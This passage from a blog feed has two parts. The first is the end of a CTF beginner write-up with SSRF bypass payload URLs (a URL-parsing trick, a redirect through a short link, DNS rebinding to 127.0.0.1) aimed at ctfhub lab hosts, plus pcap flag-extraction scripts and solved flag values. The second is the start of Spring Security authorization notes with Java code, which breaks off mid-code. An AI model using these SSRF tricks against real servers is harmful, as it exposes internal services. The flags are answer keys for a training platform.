class="line">http://challenge-8c88f2c702488010.sandbox.ctfhub.com:10800/?url=0/flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="302跳转">302跳转</span></h4><ul><li>常规解法参考上题能做。</li><li>使用<a href="https://www.bejson.com/convert/shorturl/">短地址转换</a> <code>http://127.0.0.1/flag.php</code>即可</li></ul><h4><span id="dns重绑定-bypass">DNS重绑定 Bypass</span></h4><ul><li><p><strong>同源策略</strong>：两个URL使用相同的<font color="red"><em><strong>协议、域名、端口</strong></em> </font>（IE浏览器没有端口）三者相同则称为同源。简单来说同源就是为了使一个域名下的网站只能调用本域名下的资源，防止其它域名的访问造成一些危害。</p></li><li><p>DNS重绑定：在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。（浏览器同源策略） 这就是DNS Rebinding攻击。</p></li><li><p><a href="https://zhuanlan.zhihu.com/p/89426041">参考</a></p></li><li><p><a href="https://lock.cmpxchg8b.com/rebinder.html">重绑定工具地址</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-008000c7973432be.sandbox.ctfhub.com:10800/?url=7f000001.c0a80001.rbndr.us/flag.php</span><br></pre></td></tr></table></figure></li></ul><h1><span id="reverse">Reverse</span></h1><h1><span id="crypto">Crypto</span></h1><h1><span id="misc">Misc</span></h1><h3><span id="流量分析">流量分析</span></h3><ul><li>使用到工具是<strong>WireShark</strong></li></ul><h4><span id="mysql流量">Mysql流量</span></h4><ul><li>直接下载包，然后在filter里面输入mysql，然后看info里面登录成功的那条</li><li>使用<strong>follow tcp stream</strong> 然后在<strong>find</strong>里面输入关键字<code>ctf</code>即可。</li></ul><h4><span id="redis流量">Redis流量</span></h4><ul><li><p>使用<strong>follow tcp stream</strong> 然后在<strong>find</strong>里面输入关键字<code>ctf</code>即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Fl4g1</span><br><span class="line">$22</span><br><span class="line">ctfhub&#123;6051d6123de43df</span><br><span class="line">+OK</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$5</span><br><span class="line">flag2</span><br><span class="line">$18</span><br><span class="line">ad7609804925c0121&#125;</span><br></pre></td></tr></table></figure><p>拼接出<code>ctfhub&#123;6051d6123de43dfad7609804925c0121&#125;</code></p></li></ul><h4><span id="mongodb">MongoDB</span></h4><ul><li>也是直接跟踪流，然后旁边有个选项可以直接选择第几个流，我们直接搜关键词<code>ctfhub&#123;</code>找不到就换下个流，节省很多时间。</li></ul><h4><span id="icmp-data">ICMP Data</span></h4><ul><li><p>方法一：无法跟踪流，用↓逐个观察，发现有个位置每次和上次不一样，拼起来就是flag，每次都有两个包是一样的一个<em>request</em>一个<em>response</em>，因此答案就是<code>ctfhub&#123;c87eb99796406ac0b&#125;</code></p></li><li><p>方法二：编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author：valecalida--</span></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system <span class="keyword">as</span> get_hex</span><br><span class="line"><span class="comment"># 调用tshark时需要将tshark加入环境变量，且脚本需要与流量包在一个路径下</span></span><br><span class="line"> </span><br><span class="line">get_hex(<span class="string">&quot;tshark -r icmp_data.pcap -Y \&quot;icmp &amp;&amp; icmp.type==8\&quot; -T fields -e data &gt; flag.txt&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(line[<span class="number">16</span>:<span class="number">18</span>], <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><ul><li>使用pyshark，其中<strong>type&#x3D;8即请求，type&#x3D;0即响应</strong>，这里0或者8都可以，因为是重复的。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&quot;icmp_data.pcap&quot;</span>, display_filter=<span class="string">&quot;icmp &amp;&amp; icmp.type==8&quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">25</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>(cap[i].icmp.data_data)[<span class="number">24</span>:<span class="number">26</span>], <span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li></ul><p><strong>注意</strong>：在jupyter里面使用代码会导致报错<code>This event loop is already running</code>。</p><p><em>解决方案：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> nest_asyncio</span><br><span class="line">nest_asyncio.apply()</span><br></pre></td></tr></table></figure><h4><span id="icmp-length">ICMP Length</span></h4><ul><li><p>题目提示，flag暗藏玄只因。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&#x27;icmp_len.pcap&#x27;</span>,display_filter=<span class="string">&#x27;icmp &amp;&amp; icmp.type==8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">18</span>):</span><br><span class="line">    pkt = cap[i]</span><br><span class="line">    flag+=(<span class="built_in">chr</span>(<span class="built_in">int</span>(pkt.icmp.data_len)))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></li></ul><h4><span id="icmp-lengthbin">ICMP LengthBin</span></h4><ul><li><p>题目很直接的给了提示，就是二进制与length的关系，使用wireshark打开流量包查看，使用过滤器icmp&amp;&amp; icmp.type&#x3D;&#x3D;8来进行过滤，查看每一条流量的length值，发现都是32或64，直接编写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding = utf-8</span></span><br><span class="line"><span class="comment"># --author: valecalida--</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"> </span><br><span class="line">cap = pyshark.FileCapture(<span class="string">&#x27;icmp_len_binary.pcap&#x27;</span>, display_filter=<span class="string">&quot;icmp &amp;&amp; icmp.type==8&quot;</span>)</span><br><span class="line">cap.load_packets()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">con1 = <span class="string">&quot;&quot;</span></span><br><span class="line">con2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cap)):</span><br><span class="line">    <span class="keyword">if</span> cap[i].icmp.data_len == <span class="string">&#x27;32&#x27;</span>:</span><br><span class="line">        con1 += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        con2 += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> cap[i].icmp.data_len == <span class="string">&#x27;64&#x27;</span>:</span><br><span class="line">        con1 += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        con2 += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(con1, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line"><span class="built_in">print</span>(binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(con2, base=<span class="number">2</span>))[<span class="number">2</span>:]))</span><br><span class="line">cap.close()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;收集和记录一下CTF入门的write up&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Spring Security</title>
    <link href="https://disda-coding.github.io/2022/12/23/Spring%20Security/"/>
    <id>https://disda-coding.github.io/2022/12/23/Spring%20Security/</id>
    <published>2022-12-23T10:12:13.000Z</published>
    <updated>2023-03-29T01:03:19.461Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#%E5%9F%BA%E4%BA%8Ecookie%E4%B8%8Esession%E7%9A%84%E6%96%B9%E6%A1%88">基于Cookie与Session的方案</a></li><li><a href="#%E5%9F%BA%E4%BA%8Ejwt%E7%9A%84%E6%96%B9%E6%A1%88">基于jwt的方案</a></li><li><a href="#%E5%9F%BA%E4%BA%8E%E8%87%AA%E5%AE%9A%E4%B9%89tokenredis">基于自定义Token+Redis</a></li><li><a href="#%E6%8A%80%E6%9C%AF%E8%B7%AF%E7%BA%BF">技术路线</a></li></ul><ul><li><a href="#%E9%89%B4%E6%9D%83">鉴权</a><ul><li><a href="#%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90">用户权限</a></li><li><a href="#%E9%89%B4%E6%9D%83%E8%A7%84%E5%88%99%E6%BA%90">鉴权规则源</a></li><li><a href="#%E6%8E%88%E6%9D%83%E7%AE%A1%E7%90%86">授权管理</a></li><li><a href="#%E6%8E%88%E6%9D%83%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E5%99%A8">授权错误处理器</a></li><li><a href="#%E9%85%8D%E7%BD%AE%E6%8E%88%E6%9D%83%E8%BF%87%E6%BB%A4%E5%99%A8">配置授权过滤器</a></li><li><a href="#%E9%85%8D%E7%BD%AEspring-security">配置Spring Security</a></li></ul></li></ul><!-- tocstop --><p><a href="https://tianjiashu.github.io/category/Spring/">认证部分可以看具体笔记</a></p><p><img src="https://p9-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/e97557e4960243a3942059939cdacacb~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.awebp" alt="Spring Security过滤链"></p><p><strong>图中只展示了核心过滤器</strong>，其它的非核心过滤器并没有在图中展示。</p><ul><li><code>UsernamePasswordAuthenticationFilter</code>:负责处理我们在登陆页面填写了用户名密码后的登陆请求。入门案例的认证工作主要有它负责。【判断你的用户名和密码是否正确】</li><li><code>ExceptionTranslationFilter</code>：处理过滤器链中抛出的任何<code>AccessDeniedException</code>和<code>AuthenticationException</code> 。【处理认证授权过程中的所有异常，方便统一处理】</li><li><code>FilterSecurityInterceptor</code>：负责权限校验的过滤器。【它会判断你登录成功的用户是“谁”，“你”具有什么权限，当前访问的资源需要什么权限】</li></ul><p>过程详解：</p><p>当前端提交用户名和密码过来时，进入了<code>UsernamePasswordAuthenticationFilter</code>过滤器。</p><ul><li><p>在<code>UsernamePasswordAuthenticationFilter</code>过滤器里，将传进来的用户名和密码被封装成了**<code>Authentication</code><strong>对象【这时候最多只有用户名和密码，权限还没有】，</strong><code>Authentication</code><strong>对象通过</strong><code>ProviderManager</code>的<code>authenticate</code>方法**进行认证。</p><ul><li><p>在**<code>ProviderManager</code>**里面，通过调用<code>DaoAuthenticationProvider</code>的<code>authenticate</code>方法进行认证。</p><ul><li><p>在<code>DaoAuthenticationProvider</code>里，调用**<code>InMemoryUserDetailsManager</code>的<code>loadUserByUsername</code>方法<strong>查询用户。【传入的参数只有</strong>用户名字符串**】</p><ul><li><p>在</p><p><strong><code>InMemoryUserDetailsManager</code>的<code>loadUserByUsername</code>方法</strong></p><p>里执行了以下操作</p><ol><li>根据用户名查询对于用户以及这个用户的权限信息【<strong>在内存里查</strong>】</li><li>把对应的用户信息包括权限信息封装成**<code>UserDetails</code>对象**。</li><li>返回**<code>UserDetails</code>对象**。</li></ol></li></ul></li><li><p>返回给了<code>DaoAuthenticationProvider</code>，在这个对象里执行了以下操作</p><ol><li>通过**<code>PasswordEncoder</code><strong>对比</strong><code>UserDetails</code><strong>中的密码和</strong><code>Authentication</code><strong>密码是否正确。【</strong>校验密码（经过加密的）**】</li><li>如果正确就把**<code>UserDetails</code><strong>的</strong>权限信息<strong>设置到</strong><code>Authentication</code>**对象中。</li><li>返回**<code>Authentication</code>**对象。</li></ol></li></ul></li></ul></li><li><p>又回到了过滤器里面<code>UsernamePasswordAuthenticationFilter</code>。</p><ol><li><p>如果上一步返回了**<code>Authentication</code>**对象</p><p>就使用**<code>SecurityContextHolder.getContext().setAuthentication()</code>**方法存储对象。</p><p><strong>其他过滤器</strong>会通过<code>SecurityContextHolder</code>来获取当前用户信息。【当前过滤器认证完了，后面的过滤器还需要获取用户信息，比如授权过滤器】</p></li></ol></li></ul><blockquote><p>彩色字体的类均是比较重要的<strong>接口</strong>，在实现认证的过程中均需要自定义一个类来重新实现或者变更为Spring中其他实现类。</p></blockquote><p>概念速查：</p><ul><li><strong><code>Authentication</code><strong>接口: 它的实现类，表示当前访问系统的用户，</strong>封装了用户的权限等相关信息。</strong></li><li><strong><code>AuthenticationManager</code><strong>接口：定义了认证Authentication的方法 ,实现类是</strong><code>ProviderManager</code></strong><ul><li>它的实现类是**<code>ProviderManager</code><strong>，它的功能主要是实现</strong>认证用户<strong>，因为在写登录接口时，可以通过配置类的方式，注入Spring容器中来使用它的</strong><code>authenticate</code>方法**。</li></ul></li><li><strong><code>UserDetailsService</code><strong>接口：加载用户特定数据的核心接口。里面定义了一个</strong>根据用户名查询用户信息的方法</strong>。<ul><li>原本的实现类是**<code>InMemoryUserDetailsManager</code>**，它是在内存中查询，因为我们需要自定义改接口。</li></ul></li><li>**<code>UserDetails</code><strong>接口：提供核心用户信息。通过</strong><code>UserDetailsService</code><strong>根据用户名获取处理的用户信息要封装成</strong><code>UserDetails</code><strong>对象返回。然后将这些信息封装到</strong><code>Authentication</code>**对象中。<ul><li>当我们自定义**<code>UserDetailsService</code><strong>接口时，需要我们定义一个</strong>实体类<strong>来实现这个接口来供</strong><code>UserDetailsService</code>**接口返回。【注意是实体类】</li></ul></li></ul><h3><span id="基于cookie与session的方案">基于Cookie与Session的方案</span></h3><ul><li>优点：实现简单，成熟</li><li>缺点：集群情况下实现困难，反向代理配置繁琐，移动端不友好</li></ul><h3><span id="基于jwt的方案">基于jwt的方案</span></h3><ul><li>优点：无状态，服务器资源占用小，天生支持分布式，实现简单</li><li>缺点：安全性不高，jwt没办法实现过期将用户踢下线，只能前端实现，但是jwt在有效期内依然有效。</li></ul><h3><span id="基于自定义tokenredis">基于自定义Token+Redis</span></h3><ul><li>优点：服务器可以实现对用户的下线等操作，支持分布式</li><li>缺点：相比jwt是中心化方案，对服务器存储有要求，分布式需要用到Redis</li></ul><h3><span id="技术路线">技术路线</span></h3><ul><li>可以使用controller，然后不使用formlogin就不会注入UserPasswordAuthenticationFilter（比较灵活，实现拓展功能比较简单）</li><li>也可以重写UserPasswordAuthenticationFilter，然后重写它的认证成功，失败接口</li></ul><h2><span id="鉴权">鉴权</span></h2><p>鉴权发生在认证之后，因此鉴权入口在<strong>FilterSecurityInterceptor</strong>中，<a href="https://juejin.cn/post/6847902222668431368">原理</a>不多赘述，有三种实现方法。</p><ol><li>直接重写一个<code>AccessDecisionManager</code>，将它用作默认的<code>AccessDecisionManager</code>，并在里面直接写好鉴权逻辑。</li><li>再比如重写一个投票器，将它放到默认的<code>AccessDecisionManager</code>里面，和之前一样用投票器鉴权。</li><li>我看网上还有些博客直接去做<code>FilterSecurityInterceptor</code>的改动。</li></ol><h3><span id="用户权限">用户权限</span></h3><blockquote><p>UserUserDetails 用户权限</p><p>GrantedAuthority 一般使用实现类SimpleGrantedAuthority就够了</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 当更新Admin时，传入的authorities是JSON格式，而getAuthorities()</span></span><br><span class="line"><span class="comment"> * 需要Collection&lt;? extends GrantedAuthority&gt; 格式</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 自定义JSON反序列化</span></span><br><span class="line"><span class="comment"> * CustomAuthorityDeserializer</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@JsonDeserialize(using = CustomAuthorityDeserializer.class)</span></span><br><span class="line"><span class="keyword">public</span> Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; getAuthorities() &#123;</span><br><span class="line">    List&lt;SimpleGrantedAuthority&gt; authorities = roles</span><br><span class="line">            .stream()</span><br><span class="line">            .map(role -&gt; <span class="keyword">new</span> <span class="title class_">SimpleGrantedAuthority</span>(role.getName()))</span><br><span class="line">            .collect(Collectors.toList());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> authorities;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="鉴权规则源">鉴权规则源</span></h3><blockquote><p>FilterInvocationSecurityMetadataSource 鉴权规则源</p><p>用于返回当前API所需的ROLE</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 菜单权限控制</span></span><br><span class="line"><span class="comment"> * 根据请求url分析请求所需的角色</span></span><br><span class="line"><span class="comment"> * 访问该url资源所需角色</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomFilter</span> <span class="keyword">implements</span> <span class="title class_">FilterInvocationSecurityMetadataSource</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> IMenuService menuService;</span><br><span class="line"></span><br><span class="line">    <span class="type">AntPathMatcher</span> <span class="variable">antPathMatcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntPathMatcher</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据request请求获取访问资源所需权限</span></span><br><span class="line"><span class="comment">     * 用户GrantedAuthority与ConfigAttribute一对比就知道用户有没有权限访问该api了</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> o</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;ConfigAttribute&gt; <span class="title function_">getAttributes</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IllegalArgumentException &#123;</span><br><span class="line">        <span class="comment">//获取请求的url</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">requestUrl</span> <span class="operator">=</span> ((FilterInvocation) o).getRequestUrl();</span><br><span class="line">        List&lt;Menu&gt; menus = menuService.getMenusWithRole();</span><br><span class="line">        <span class="keyword">for</span> (Menu menu : menus) &#123;</span><br><span class="line">            <span class="comment">//判断请求url与菜单角色是否匹配</span></span><br><span class="line">            <span class="keyword">if</span> (antPathMatcher.match(menu.getUrl(),requestUrl)) &#123;</span><br><span class="line">                <span class="comment">//得到rname，并将其放入一个string集合中,一个url可能对应多个角色</span></span><br><span class="line">                String[] str = menu.getRoles().stream().map(Role::getName).toArray(String[]::<span class="keyword">new</span>);</span><br><span class="line">                <span class="comment">//将得到的角色放入List里</span></span><br><span class="line">                <span class="keyword">return</span> SecurityConfig.createList(str);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//给一个默认登录即可访问角色</span></span><br><span class="line">        <span class="keyword">return</span> SecurityConfig.createList(<span class="string">&quot;ROLE_LOGIN&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;ConfigAttribute&gt; <span class="title function_">getAllConfigAttributes</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">supports</span><span class="params">(Class&lt;?&gt; aClass)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="授权管理">授权管理</span></h3><blockquote><p>AccessDecisionManager</p><p>用户GrantedAuthority与ConfigAttribute一对比就知道用户有没有权限访问该api了</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Authentication authentication</span></span><br><span class="line"><span class="comment"> * 认证之后的身份</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Object o</span></span><br><span class="line"><span class="comment"> * Object对象这里是要访问的受保护资源，他是一个FilterInvocation类型,你可以通过这个对象获取当前所访问的路径</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Collection&lt;ConfigAttribute&gt; configAttributes</span></span><br><span class="line"><span class="comment"> * Collection集合就是要操作当前资源，所需要的角色。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/weixin_43836204/article/details/106310730</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decide</span><span class="params">(Authentication authentication, Object o, Collection&lt;ConfigAttribute&gt; configAttributes)</span> <span class="keyword">throws</span> AccessDeniedException, InsufficientAuthenticationException &#123;</span><br><span class="line">    <span class="keyword">for</span> (ConfigAttribute attribute : configAttributes) &#123;</span><br><span class="line">        <span class="comment">//当前url资源所需角色</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">needRole</span> <span class="operator">=</span> attribute.getAttribute();</span><br><span class="line">        <span class="comment">//判断用户角色是否为url所需角色</span></span><br><span class="line">        Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; authorities = authentication.getAuthorities();</span><br><span class="line">        <span class="keyword">for</span> (GrantedAuthority authority : authorities) &#123;</span><br><span class="line">            <span class="keyword">if</span> (authority.getAuthority().equals(needRole)) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断角色是否是登录即可访问的角色，此角色在CustomFilter中设置</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;ROLE_LOGIN&quot;</span>.equals(needRole)) &#123;</span><br><span class="line">            <span class="comment">//判断是否登录</span></span><br><span class="line">            <span class="keyword">if</span> (authentication <span class="keyword">instanceof</span> AnonymousAuthenticationToken) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedException</span>(<span class="string">&quot;尚未登录，请登录&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessDeniedException</span>(<span class="string">&quot;权限不足，请联系管理员&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="授权错误处理器">授权错误处理器</span></h3><blockquote><p>AccessDeniedHandler</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: cowork-back</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 当访问接口没权限时，自定义返回结果</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: disda</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2022-01-24 15:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestfulAccessDeniedHandler</span> <span 